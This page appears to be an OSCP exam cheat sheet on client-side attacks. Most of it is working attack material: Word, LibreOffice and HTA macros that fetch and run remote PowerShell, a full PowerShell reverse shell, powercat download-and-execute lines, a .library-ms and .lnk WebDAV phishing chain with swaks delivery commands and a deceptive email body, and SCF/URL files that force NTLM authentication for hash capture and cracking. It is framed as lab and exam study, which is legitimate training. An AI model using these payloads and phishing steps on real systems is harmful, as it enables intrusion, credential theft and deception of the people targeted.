---
title: "Client-Side Attacks"
date: 2026-06-20
weight: 130
draft: false
summary: "Collection of attacks that target the user directly through email, file uploads, and web paths to establish an initial foothold."
---

Collection of attacks that target the user directly through email, file uploads, and web paths to establish an initial foothold.

- Source: https://heretek.dev/oscp-cheatsheet/client-side-attacks/ (Jean Romero) — Reconstructed
- Variables: `$TARGET` = target host, `$KALI` = attacker Kali IP

## Attack Selection Decision Tree

```text
Can you send email to target?
├── YES → Word Macro (.doc) or Library File (.library-ms) + .lnk
│         └── SMTP server available? → deliver with swaks
└── NO
    ├── Writable SMB share?
    │   └── YES → Drop SCF/URL file → capture NTLMv2 hash → crack
    └── Can victim visit a URL?
        └── YES → HTA file hosted on your server
```

- The exam is assumed-breach format, so client-side attacks rarely appear. Learn them for standalone boxes.

## Attack Selection Table by Situation

- SMTP + can send email + have a Windows box → Library-ms + .lnk (build: text editor + Windows GUI, deliver: swaks)
- SMTP + can send email (no Windows) → Word macro .doc (build: LibreOffice, deliver: swaks)
- Web upload form → ODT macro (build: LibreOffice GUI, deliver: upload form)
- Writable SMB share → SCF/URL file (build: text editor, deliver: drop on the share + Responder)
- Victim visits your URL → HTA file (build: text editor, deliver: python3 http.server)

## Word VBA Macro Attack

### Step 1 — Generate an encoded reverse shell

```bash
# Encode PowerShell payload (UTF-16LE + Base64 — required for -enc flag)
python3 -c "
import base64,sys
cmd = sys.argv[1]
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
" "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER/powercat.ps1');powercat -c ATTACKER -p 443 -e powershell"
```

### Step 2 — Create the macro in Word

View → Macros → Create:

```text
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = "powershell.exe -nop -w hidden -enc "
    Str = Str + "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUA..."   ' chunk 1
    Str = Str + "YwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdA..."   ' chunk 2
    CreateObject("Wscript.Shell").Run Str
End Sub
```

- Always save as .doc (Word 97-2003). Macros are not preserved in .docx.

Script that splits base64 into 50-character chunks safe for VBA:

```python
import sys
str = sys.argv[1]  # pass the base64 string as argument
n = 50
for i in range(0, len(str), n):
    print('Str = Str + "' + str[i:i+n] + '"')
```

```bash
# Usage: python3 split.py <BASE64_STRING>
# Paste the output between the macro's Str = "powershell..." line and CreateObject
```

### Step 3 — Delivery

```bash
# Host PowerCat
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80

# Listener
nc -nlvp 443
```

## Windows Library File Attack (.library-ms)

Create a fake library that points at a WebDAV server. When the victim opens it, Explorer connects to your WebDAV, and the malicious .lnk shortcut inside becomes visible.

### Step 1 — WebDAV server

```bash
pip3 install wsgidav
mkdir ~/webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav
```

### Step 2 — Create the library file

Save as config.Library-ms:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <n>@windows.storage.dll,-34582</n>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>http://ATTACKER_IP</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

### Step 3 — Create the malicious shortcut (.lnk)

On Windows (RDP), right-click the desktop > New > Shortcut. Below is the short powercat target (see the full chain section later for why):

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI:8000/powercat.ps1'); powercat -c $KALI -p 4445 -e powershell"
```

### Step 4 — Deliver by email

swaks is the SMTP multi-tool. It sends email from the command line.

```bash
# FIRST — test if email delivers (no attachment, just a test)
sudo swaks -t TARGET@domain.com --from SENDER@domain.com --server MAIL_IP --body "test" --header "Subject: test"

# Reading output:
#   RCPT TO -> 250 OK      = email DELIVERED
#   RCPT TO -> 550 Unknown  = rejected — try adding auth below

# If 550 — add SMTP authentication
sudo swaks -t TARGET@domain.com --from SENDER@domain.com --server MAIL_IP --body "test" --header "Subject: test" -ap -au SMTP_USER -ap SMTP_PASS

# swaks flags:
#   -t            = TO (recipient)
#   --from        = FROM (sender address)
#   --server      = mail server IP
#   -ap           = enable SMTP authentication
#   -au           = auth username (SMTP login — NOT necessarily the sender)
#   -ap           = auth password (found in config files, git repos, databases)
#   --attach @    = attach a file (@ means read from file path)
#   --body @      = email body from file (@ means read from file path)
#   --suppress-data = cleaner output

# REAL phishing email (after test works)
sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap -au SMTP_USER -ap SMTP_PASS
```

How to find SMTP creds:

- Found in config files containing words like "email configuration", "smtp", "mail server".
- A person listed as "contact" or "responsible" is the phishing target, not the sender.

## LibreOffice ODT Macro Attack

The ODT document version of the same concept as the Word macro. Use it when an upload form accepts ODT/document files and the server automatically "reviews" or processes them.

Step-by-step:

```bash
# 1. Create reverse shell script on Kali
cat > /home/kali/shell.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
EOF

# 2. Open LibreOffice
libreoffice --writer
```

Inside LibreOffice:

- Enter fake content, then File → Save As → resume.odt (must save first)
- Tools → Macros → Edit Macros
- In the left panel, expand resume.odt → Standard → Module1 (not "My Macros")
- Paste the macro:

```basic
Sub Main
    Shell("cmd.exe /c powershell IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')")
End Sub
```

- Save with Ctrl+S
- Tools → Customize → Events tab
- Change the "Save in:" dropdown to resume.odt (not LibreOffice)
- Select Open Document → click Macro... → resume.odt → Standard → Module1 → Main
- OK → OK → Ctrl+S again

Deploy (deliver):

```bash
# Terminal 1: serve shell.ps1
python3 -m http.server 80

# Terminal 2: listener
rlwrap nc -lvnp 4444

# Upload resume.odt through web form
```

The order matters or it fails: save the document → add the macro to the document → save → set the event trigger with "Save in: resume.odt" → save.

## HTA (HTML Application) Attack

```html
<html>
<body>
<script>
var c = "powershell.exe -nop -w hidden -enc <BASE64>";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```

```bash
python3 -m http.server 80
# Victim visits: http://ATTACKER/evil.hta → browser prompts to open → shell
```

- msfvenom -f hta-pse counts as one Metasploit use. Prefer a manual HTA.

## Forced Authentication via Writable Share

Drop the files below onto a writable SMB share. When a user browses the share, Windows automatically loads the icon from your server → the NTLMv2 hash comes to you.

### SCF file (save as @inventory.scf — the @ sorts it to the top of the list)

```ini
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

### URL file

```ini
[InternetShortcut]
URL=http://ATTACKER_IP/test
IconIndex=0
IconFile=\\ATTACKER_IP\share\icon.ico
```

### Capturing the hash

```bash
sudo responder -I tun0 -v -A    # ANALYZE mode on exam!
# Or:
impacket-smbserver share . -smb2support
```

### Cracking the captured NTLMv2 hash

Save the entire [SMB] NTLMv2-SSP Hash line that Responder prints to a file and crack it (NTLMv2 cannot be passed, it must be cracked):

```bash
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

- For mode numbers in detail → [hash-types.md](hash-types.md), [password-attacks.md](password-attacks.md)

## Payload Encoding Quick Reference

PowerShell requires UTF-16LE encoding before Base64:

```bash
# Python one-liner
python3 -c "
import base64,sys
cmd = sys.argv[1]
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
" "YOUR_POWERSHELL_COMMAND_HERE"

# Use with:
powershell.exe -nop -w hidden -enc <OUTPUT>
```

## Windows Library + WebDAV Phishing (full chain)

When to use: you have valid domain creds + SMTP access but no shell access (no WinRM/RDP/admin). Send a phishing email with a .Library-ms attachment; when the victim opens it, Explorer connects to your WebDAV, and clicking the malicious .lnk inside gives a reverse shell.

### Chain flow

```text
Email with .Library-ms attachment
  -> Victim opens .Library-ms
  -> Windows Explorer connects to YOUR WebDAV share (looks like a local folder)
  -> Victim sees a .lnk shortcut inside the folder
  -> Victim double-clicks .lnk
  -> .lnk runs PowerShell: downloads powercat.ps1 from your HTTP server
  -> powercat creates reverse shell back to your Netcat listener
  -> You have a shell on the victims internal workstation
```

### Step 1: WebDAV server on Kali (port 80)

```bash
pip install wsgidav
mkdir -p ~/webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav/
```

### Step 2: Create the .Library-ms file

Tool: any text editor (nano on Kali is enough). It is just XML. Save with the .Library-ms extension. Filename config.Library-ms:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<n>@windows.storage.dll,-34582</n>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://KALI_IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

- Save this file in your working directory (not the webdav folder). It is the file sent as an email attachment and is not served by WebDAV.

### Step 3: Create the malicious shortcut (.lnk)

- Tool: Windows-only GUI. You cannot create a .lnk on Linux. Connect over RDP, right-click the desktop > New > Shortcut.
- Warning: Windows shortcut targets have a limit of about 260 characters. Base64-encoded payloads get truncated and fail silently.
- Use the "short" powercat version that goes in the field:

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8000/powercat.ps1'); powercat -c KALI_IP -p 4444 -e powershell"
```

- Do not use -enc with a long base64 string — it gets truncated and nothing happens, with no error.
- Name it install. Move the .lnk to ~/webdav/ (the WebDAV root).

### Step 4: Serve PowerCat (port 8000)

```bash
# Find powercat (path varies by Kali version)
find / -name powercat.ps1 2>/dev/null
# Common locations:
# /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1
# /usr/share/windows-resources/powercat/powercat.ps1
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000
```

### Step 5: Start the listener (port 4444)

```bash
nc -nvlp 4444
```

### Step 6: Send the phishing email (from Kali)

See the email delivery section above for the full swaks flag reference. One-line version:

```bash
# Without auth (open relay)
sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data

# With auth (if above returns 550)
sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap -au SMTP_USER -ap SMTP_PASS
```

body.txt example:

```text
Hey!
Please install the new security features on your workstation.
Download the attached file, double-click on it, and execute
the configuration shortcut within. Thanks!
```

### Four terminals running at the same time

- Terminal 1: wsgidav (WebDAV), port 80 — hosts the .lnk (the victim browses here)
- Terminal 2: python3 HTTP, port 8000 — serves powercat.ps1
- Terminal 3: nc listener, port 4444 — receives the reverse shell
- Terminal 4: swaks — sends the phishing email

### File placement (easy to confuse under pressure)

- config.Library-ms — build: Kali text editor (just XML) — deliver: emailed as a swaks attachment — the victim opens it in Explorer
- powercat.ps1 — build: copy from /usr/share/powershell-empire/... on Kali — deliver: served by python3 http.server :8000 — the .lnk downloads it automatically

### Key points

- .Library-ms = email attachment (do not put it in the webdav folder)
- .lnk = inside the webdav folder (the victim sees it after opening the library file)
- WebDAV must be on port 80 (Windows Explorer requires it)
- The library file URL = Kali IP, with no path after it
- swaks -ap = mail server password authentication
- After getting a shell: upload winPEAS, run SharpHound, set up Meterpreter+SOCKS for pivoting

### Troubleshooting (when phishing does not work)

- Did swaks deliver it — check the output for "250 OK" or "250 Queued". If you see an error, the mail was not sent.
- Try without -ap first — many lab mail servers are open relays. -ap may force unnecessary authentication.
- No WebDAV connection — the URL in the Library-ms is wrong or the mail was not opened. Check that the URL in the XML exactly matches the Kali IP.
- WebDAV connects but no shell — the .lnk payload is broken. Check the powercat command and that the listener and port match.
- Try every email format — firstname@domain.com, f.lastname@domain.com, first.last@domain.com
- Send to every employee — do not look for just one person, send to every name you found.
- Wait 1-2 minutes — simulated users do not click immediately.
- Send config.Library-ms as a swaks attachment, do not put it in the webdav folder.
- If sending on port 25 (privileged port), use sudo for swaks.
